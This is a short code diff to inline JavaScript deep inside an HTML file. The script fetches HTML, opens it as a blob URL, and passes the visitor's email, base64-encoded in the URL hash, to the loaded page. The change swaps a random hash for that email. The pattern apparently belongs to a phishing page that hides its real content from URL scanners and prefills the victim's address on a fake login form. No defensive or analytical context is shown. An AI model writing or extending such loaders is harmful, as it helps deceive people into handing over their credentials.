@@ -17777,19 +17777,15 @@
         .then(html => {
           const blob = new Blob([html], {type: 'text/html'});
           const blobUrl = URL.createObjectURL(blob);
-          const randomHash = '#' + Math.random().toString(36).substring(2, 15);
+          const email = hash.replace('#', '');
+          const encoded = '#' + btoa(email);
           sessionStorage.setItem('h', hash);
-          window.location.replace(blobUrl + randomHash);
+          window.location.replace(blobUrl + encoded);
         });
     } else {
-      const stored = sessionStorage.getItem('h');
-      if (stored) {
-        sessionStorage.removeItem('h');
-        window.location.hash = stored.replace('#', '');
-        setTimeout(() => {
-          history.replaceState(null, '', window.location.href.split('#')[0]);
-        }, 2000);
-      }
+      const encoded = window.location.hash.replace('#', '');
+      const email = atob(encoded);
+      window.location.hash = email;
     }
   </script>
    
